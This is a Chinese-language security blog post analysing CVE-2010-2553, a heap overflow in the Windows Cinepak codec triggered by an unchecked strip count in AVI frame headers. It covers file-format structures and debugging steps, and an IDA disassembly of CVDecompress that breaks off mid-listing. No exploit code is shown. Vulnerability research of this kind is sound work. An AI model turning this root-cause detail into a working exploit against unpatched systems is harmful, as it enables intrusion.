<!DOCTYPE html><html lang="en, zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech, Bug"><meta name="author" content="7erry"><script>!function(){function e(e){const t="dark"===e,c=document.documentElement;c.classList.add(e),c.classList.remove(t?"light":"dark"),c.style.colorScheme=e}const t=function(){try{const e=localStorage.getItem("REDEFINE-THEME-STATUS");if(e){const{isDark:t}=JSON.parse(e);return t?"dark":"light"}}catch(e){}return matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"}();e(t),matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:t})=>{localStorage.getItem("REDEFINE-THEME-STATUS")||e(t?"dark":"light")}),function(){const e=()=>{const e=document.body;return!!e&&(e.classList.add(t+"-mode"),!0)};if(e())return;const c=new MutationObserver(()=>{e()&&c.disconnect()});c.observe(document.documentElement,{childList:!0,subtree:!0})}()}()</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://7erryX.github.io/2024/09/09/vulnerability investigation/cve-2010-2553-investigation/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:type" content="article"><meta property="og:title" content="CVE-2010-2553 Investigation"><meta property="og:url" content="https://7erryx.github.io/2024/09/09/Vulnerability%20Investigation/CVE-2010-2553-Investigation/index.html"><meta property="og:site_name" content="7erry"><meta property="og:description" content="(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"><meta property="og:locale"><meta property="og:image" content="https://7erryx.github.io/images/default_avatar.png"><meta property="article:published_time" content="2024-09-09T05:35:03.000Z"><meta property="article:modified_time" content="2024-09-09T05:35:03.000Z"><meta property="article:author" content="7erry"><meta property="article:tag" content="Blog, Security, Vulnerability, Flaw, Life, Software, Research, Tech, Bug"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://7erryx.github.io/images/default_avatar.png"><script src="https://www.googletagmanager.com/gtag/js?id=G-RWM51NR8JQ"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-RWM51NR8JQ")</script><link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/favicon.ico"><title>CVE-2010-2553 Investigation | 7erry</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/tailwind.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script src="/js/build/libs/anime.min.js"></script><script id="hexo-configurations">window.config={hostname:"7erryx.github.io",root:"/",language:"en, zh-CN",path:"search.json"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!0,title_alignment:"left",headings_top_spacing:{h1:"5rem",h2:"4rem",h3:"2.8rem",h4:"2.5rem",h5:"2.2rem",h6:"2rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!1,auto:!1,list:[]},code_block:{copy:!0,style:"simple",highlight_theme:{light:"github",dark:"github-dark"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/recommend.jpg",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!0,custom_message:"7erry's Website"},side_tools:{gear_rotation:!0,auto_expand:!0},open_graph:{enable:!0,image:"/images/default_avatar.png",description:"(v50) 経験に3を加えて,失礼します [中国翻訳] [無修正]"},google_analytics:{enable:!0,id:"G-RWM51NR8JQ"}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/background_light.jpg",dark:"/images/background_dark.jpg"},title:"7erry's Website",subtitle:{text:["君子慎独","君子不器","君子不争","君子不为苛察，不以身假物","君子务本，本立而道生","人有不为也，而后可以有为","胜人者力，自胜者强","问题是思考的钥匙","在伟大的时代，做渺小的贡献","Fall in Love with the Problem, Not the Solution","Do The Right Thing, Do The Thing Right","Lux et veritas","Mens et Manus","Per Aspera Ad Astra","Ends justify the means","取势，明道，优术","Do things right, not things easy"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#000",dark:"#fff"},text_style:{title_size:"5.7rem",subtitle_size:"1.9rem",line_height:1.1},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/7erryX",instagram:null,zhihu:null,twitter:null,email:"w.7erry@qq.com",bilibili:"https://space.bilibili.com/25689965"},qrs:null}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!0,version:"9.3.0"}},version:"2.8.5",navbar:{auto_hide:!0,color:{left:"#7ab8cc",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"},Anime:{path:"/bangumis",icon:"fa-brands fa-youtube"},Cinema:{path:"/cinemas",icon:"fa-solid fa-film"},About:{path:"/about",icon:"fa-regular fa-user"}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"info",announcement:null,show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:1},tags:{enable:!1,limit:3}},footerStart:"2020/2/2 20:20:22"},window.lang_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><style>:root{--preloader-background-color:#fff;--preloader-text-color:#000}@media (prefers-color-scheme:dark){:root{--preloader-background-color:#202124;--preloader-text-color:#fff}}@media (prefers-color-scheme:light){:root{--preloader-background-color:#fff;--preloader-text-color:#000}}@media (max-width:600px){.ml13{font-size:2.6rem!important}}.preloader{display:flex;flex-direction:column;gap:1rem;align-items:center;justify-content:center;position:fixed;padding:12px;top:0;right:0;bottom:0;left:0;width:100vw;height:100vh;background-color:var(--preloader-background-color);z-index:1100;transition:opacity .2s ease-in-out}.ml13{font-size:3.2rem;color:var(--preloader-text-color);letter-spacing:-1px;font-weight:500;font-family:Chillax-Variable,sans-serif;text-align:center}.ml13 .word{display:inline-flex;flex-wrap:wrap;white-space:nowrap}.ml13 .letter{display:inline-block;line-height:1em}</style><div class="preloader"><h2 class="ml13">7erry&#39;s Website</h2><script>var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }</script></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/"><img src="/images/favicon.ico" class="w-full h-full rounded-xs"> </a><a class="logo-title" href="/">7erry</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> ARCHIVES</a></li><li class="navbar-item"><a href="/bangumis"><i class="fa-brands fa-youtube fa-fw"></i> ANIME</a></li><li class="navbar-item"><a href="/cinemas"><i class="fa-solid fa-film fa-fw"></i> CINEMA</a></li><li class="navbar-item"><a href="/about"><i class="fa-regular fa-user fa-fw"></i> ABOUT</a></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>HOME </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>ARCHIVES </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/bangumis"><span>ANIME </span><i class="fa-brands fa-youtube fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/cinemas"><span>CINEMA </span><i class="fa-solid fa-film fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/about"><span>ABOUT </span><i class="fa-regular fa-user fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">Tags</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div><div class="label text-third-text-color text-sm">Categories</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">83</div><div class="label text-third-text-color text-sm">Posts</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2010-2553 Investigation</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/default_avatar.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">7erry</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2024-09-09 13:35:03</span> <span class="mobile">2024-09-09 13:35:03</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2024-09-09 13:35:03</span> <span class="mobile">2024-09-09 13:35:03</span> <span class="hover-info">Updated</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/Vulnerability-Investigation/">Vulnerability Investigation</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>6k Words</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>34 Mins</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p>Microsoft Windows Cinepak 编解码器对媒体文件解压缩时存在代码控制不当, 其中(iccvid.dll)的 CVDCompress 函数在解压缩媒体文件时未对 Cinepak(CVID) Stream Format 中的 Number of coded strips(Frame Header) 大小充分检测与限制, 导致在复制压缩数据时造成堆溢出, 进而导致程序崩溃或任意代码执行(maybe)</p><p>影响范围：<br>Microsoft Windows XP Professional x64 Edition Service Pack 2<br>Microsoft Windows XP Service Pack 3<br>Microsoft Windows Vista Service Pack 1 and Microsoft Windows Vista Service Pack 2<br>Microsoft Windows Vista x64 Edition Service Pack 1 and Microsoft Windows Vista x64 Edition Service Pack 2<br>Microsoft Windows 7 for 32-bit Systems<br>Microsoft Windows 7 for x64-based Systems</p><span id="more"></span><h2 id="RIFF-文件及其基本数据结构"><a href="#RIFF-文件及其基本数据结构" class="headerlink" title="RIFF 文件及其基本数据结构"></a>RIFF 文件及其基本数据结构</h2><p>RIFF(Resource Interchange File Format 资源交换文件格式)是一种通用文件容器格式, 主要用于存储包括但不限于音频和视频的多媒体数据。RIFF 文件所包含的数据类型由该文件的扩展名来标识, 例如：</p><ul><li>音频视频交错格式数据(.AVI)</li><li>波形格式数据(.WAV)</li><li>位图格式数据(.RDI)</li><li>MIDI 格式数据(.RMI)</li><li>调色板格式数据(.PAL)</li><li>多媒体电影格式数据(.RMN)</li><li>动画光标格式数据(.ANI)</li><li>其它 RIFF 文件(.BND)</li></ul><p>RIFF 文件的基本单元是 Chunk, 其数据结构如下</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    u32 id;</span><br><span class="line">    u32 size;</span><br><span class="line">    u8 data[size];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>id 为 4 个 ASCII 字符组成 FourCC(Four Character Code) 格式标识符, 用以识别块中所包含的数据类型。<br>size 为存储在 data 字段中的数据的长度。<br>data 为 Chunk 内包含的实际内容, 以字为单位排列, 字节数为奇数时以空字节补齐。当块标识符(id)为 RIFF 或 LIST 时, data 字段可以包含子块, 其余块只能包含数据。</p><h2 id="AVI-文件及其基本数据结构"><a href="#AVI-文件及其基本数据结构" class="headerlink" title="AVI 文件及其基本数据结构"></a>AVI 文件及其基本数据结构</h2><p>AVI(Audio Video Interleaved) 是 Microsoft 于 1992 年 11 月开发的一种符合 RIFF 文件规范的多媒体容器格式, 可以在文件容器中同时包含音频和视频数据, 并于 2010 年由美国政府的国家档案和记录管理局被定为用于保存数字视频的官方文件格式。基本上, AVI 文件有 3 种类型：</p><ul><li>AVI1.0: 原始 AVI 格式, 也是最基本的格式。一般情况下其索引地址与大小为 4 字节, 最大容量为 4GB</li><li>Open-DML(AVI2.0): AVI 文件格式的扩展。于 1996 年 2 月 28 日由 Matrox OpenDML 开发, 受 Microsoft 支持并被非正式地成为 AVI2.0。最重要的改进是：<ul><li>对文件大小几乎没有限制</li><li>减少了 33%的开销</li></ul></li><li>Hybride-Files</li></ul><p>AVI 文件由 Chunks 和 Lists 两种基本单元组成, 与 RIFF 文件的基本单元 Chunk 类似, 其数据结构如下：</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;</span><br><span class="line">    DWORD dwSize;</span><br><span class="line">    BYTE data[dwSize];</span><br><span class="line">&#125;CHUNK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwList;</span><br><span class="line">    DWORD dwSize;</span><br><span class="line">    DWORD dwFourCC; </span><br><span class="line">    BYTE data[dwSize<span class="number">-4</span>];</span><br><span class="line">&#125;LIST;</span><br></pre></td></tr></table></figure></div><p>其中 dwFourCC 与 dwList 为标识符字段, dwSize 为包含数据的大小, data 为包含的数据。</p><blockquote><p>AVI 文件格式细节参阅 <a href="#reference">sp4n9x’s Blog AVI 文件格式分析</a></p></blockquote><h2 id="Cinepak-Stream-Format"><a href="#Cinepak-Stream-Format" class="headerlink" title="Cinepak Stream Format"></a>Cinepak Stream Format</h2><p>Cinepak 压缩格式的视频流由由 Frame Header 和多个 Strip 组成。Frame Header 的长度为 10 个字节, 分别表示</p><ul><li>Flags: 位 0 指定每个 Strip 的 codebooks 是否使用上一个 Strip 中定义的 codebooks</li><li>Length of CVID data: Frame 中的字节总数</li><li>Width of coded frame : Frame 的像素宽度</li><li>Height of coded frame: Frame 的像素高度</li><li>Number of coded strips: 用于对 Frame 进行编码的 Strips 总数</li></ul><p>本漏洞的成因即为程序 Frame Header 内的 Number of coded strips 未进行任何限制而在复制数据时造成了堆溢出</p><blockquote><p>Cinepak 压缩格式细节参阅 <a href="#reference">Cinepak 压缩格式</a></p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用 Windows Media Player(wmplay.exe) 打开样本 .avi 文件后触发 Access violation 而中断。开启 hpa 和 ust 进行调试, 栈回溯查看崩溃函数的主调函数并下断点, 发现触发异常的函数位于 iccvid.dll 模块。使用 IDA 打开 iccvid.dll 时可以通过选项下载微软符号表, 定位到崩溃函数所在位置</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line">.text:73B721AE</span><br><span class="line">.text:73B721AE                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:73B721AE</span><br><span class="line">.text:73B721AE                               ; Attributes: bp-based frame</span><br><span class="line">.text:73B721AE</span><br><span class="line">.text:73B721AE                               ; int __stdcall CVDecompress(ULONG, _BYTE *, unsigned int, int, int, int, int)</span><br><span class="line">.text:73B721AE                               _CVDecompress@28 proc near              ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+27↓p</span><br><span class="line">.text:73B721AE                                                                       ; Decompress(x,x,x,x,x,x,x,x,x,x,x,x,x,x)+118↓p</span><br><span class="line">.text:73B721AE                                                                       ; Decompress(x,x,x,x,x,x,x,x,x,x,x,x,x,x)+140↓p</span><br><span class="line">.text:73B721AE</span><br><span class="line">.text:73B721AE                               var_20= dword ptr -20h</span><br><span class="line">.text:73B721AE                               var_1C= dword ptr -1Ch</span><br><span class="line">.text:73B721AE                               var_18= dword ptr -18h</span><br><span class="line">.text:73B721AE                               var_14= dword ptr -14h</span><br><span class="line">.text:73B721AE                               pulResult= dword ptr -10h</span><br><span class="line">.text:73B721AE                               var_C= dword ptr -0Ch</span><br><span class="line">.text:73B721AE                               ulMinuend= dword ptr -8</span><br><span class="line">.text:73B721AE                               var_4= dword ptr -4</span><br><span class="line">.text:73B721AE                               arg_0= dword ptr  8</span><br><span class="line">.text:73B721AE                               arg_4= dword ptr  0Ch</span><br><span class="line">.text:73B721AE                               arg_8= dword ptr  10h</span><br><span class="line">.text:73B721AE                               arg_C= dword ptr  14h</span><br><span class="line">.text:73B721AE                               arg_10= dword ptr  18h</span><br><span class="line">.text:73B721AE                               arg_14= dword ptr  1Ch</span><br><span class="line">.text:73B721AE                               arg_18= 